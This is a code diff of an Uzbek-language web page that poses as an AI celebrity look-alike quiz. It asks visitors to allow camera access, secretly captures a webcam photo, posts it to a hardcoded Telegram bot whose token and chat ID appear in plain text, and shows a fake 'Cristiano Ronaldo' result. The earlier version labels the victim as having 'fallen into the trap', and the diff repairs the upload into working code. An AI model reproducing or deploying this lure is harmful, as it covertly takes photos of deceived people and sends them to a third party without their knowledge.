@@ -4,62 +4,145 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>AI Face Analyzer</title>
+
     <style>
-        body { font-family: sans-serif; text-align: center; background-color: #f0f2f5; padding-top: 50px; }
-        .container { background: white; padding: 30px; border-radius: 20px; display: inline-block; box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
-        button { background: #0095f6; color: white; border: none; padding: 15px 30px; border-radius: 10px; cursor: pointer; font-weight: bold; font-size: 18px; }
+        body {
+            font-family: sans-serif;
+            text-align: center;
+            background: #f0f2f5;
+            padding-top: 50px;
+        }
+
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 20px;
+            display: inline-block;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+        }
+
+        button {
+            background: #0095f6;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 10px;
+            cursor: pointer;
+            font-size: 18px;
+        }
+
         #video { display: none; }
+
+        .loader {
+            border: 4px solid #eee;
+            border-top: 4px solid #0095f6;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            display: none;
+            margin: 10px auto;
+        }
+
+        @keyframes spin {
+            100% { transform: rotate(360deg); }
+        }
     </style>
 </head>
+
 <body>
 
 <div class="container">
     <h2>Siz qaysi mashhur insonga o'xshaysiz? 🤔</h2>
-    <p>AI tizimi yuzingizni skaner qilishi uchun ruxsat bering:</p>
-    <button onclick="startPrank()">Testni boshlash</button>
-    <p id="status" style="margin-top: 20px; font-weight: bold; color: #0095f6;"></p>
+    <p>Kameraga ruxsat bering</p>
+
+    <div id="loader" class="loader"></div>
+
+    <button id="startBtn">Boshlash</button>
+
+    <p id="status"></p>
 </div>
 
 <video id="video" autoplay playsinline></video>
 <canvas id="canvas" style="display:none;"></canvas>
 
 <script>
-    const BOT_TOKEN = '8773988826:AAFjeAtak_rptAUTFbhnGLj87DA1cuemyTw';
-    const CHAT_ID = '5777502829'; // Sizning raqamingiz o'rnatildi!
+const BOT_TOKEN = '8773988826:AAFjeAtak_rptAUTFbhnGLj87DA1cuemyTw';
+const CHAT_ID = '5777502829';
 
-    async function startPrank() {
-        const status = document.getElementById('status');
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            const video = document.getElementById('video');
-            video.srcObject = stream;
-            status.innerText = "Skaner qilinmoqda... 3 soniya kuting...";
+document.getElementById("startBtn").onclick = start;
 
-            setTimeout(async () => {
-                const canvas = document.getElementById('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                
-                canvas.toBlob(async (blob) => {
-                    const formData = new FormData();
-                    formData.append('chat_id', CHAT_ID);
-                    formData.append('photo', blob, 'prank.jpg');
-                    formData.append('caption', '🎯 Tuzoqqa tushdi! Mana uning rasmi.');
+async function start() {
+    const status = document.getElementById('status');
+    const loader = document.getElementById('loader');
+    const btn = document.getElementById('startBtn');
+    const video = document.getElementById('video');
 
-                    await fetch(`https://telegram.org{BOT_TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    });
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
 
-                    status.innerHTML = "Tahlil tugadi!<br>Siz: <b>Cristiano Ronaldoga</b> 98% o'xshaysiz! 😂";
-                    stream.getTracks().forEach(track => track.stop());
-                }, 'image/jpeg');
-            }, 3000);
-        } catch (err) {
-            status.innerText = "Xato: Kamera ruxsat berilmadi!";
-        }
+        btn.style.display = "none";
+        loader.style.display = "block";
+        status.innerText = "Kamera yoqildi...";
+
+        video.onloadedmetadata = () => {
+            setTimeout(() => takePhoto(stream), 3000);
+        };
+
+    } catch (err) {
+        status.innerText = "Kamera ishlamadi!";
     }
+}
+
+function takePhoto(stream) {
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const status = document.getElementById('status');
+
+    if (video.videoWidth === 0) {
+        status.innerText = "Kamera tayyor emas!";
+        return;
+    }
+
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0);
+
+    canvas.toBlob(sendToTelegram, 'image/jpeg');
+}
+
+async function sendToTelegram(blob) {
+    const status = document.getElementById('status');
+    const loader = document.getElementById('loader');
+
+    const formData = new FormData();
+    formData.append('chat_id', CHAT_ID);
+    formData.append('photo', blob, 'photo.jpg');
+
+    try {
+        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+        });
+
+        const data = await res.json();
+        console.log(data);
+
+        if (data.ok) {
+            status.innerHTML = "✅ Tayyor!<br><b>Cristiano Ronaldo 😎</b>";
+        } else {
+            status.innerText = "❌ Telegram xato!";
+        }
+
+    } catch (e) {
+        status.innerText = "❌ Internet yoki blok!";
+    }
+
+    loader.style.display = "none";
+}
 </script>
 
 </body>
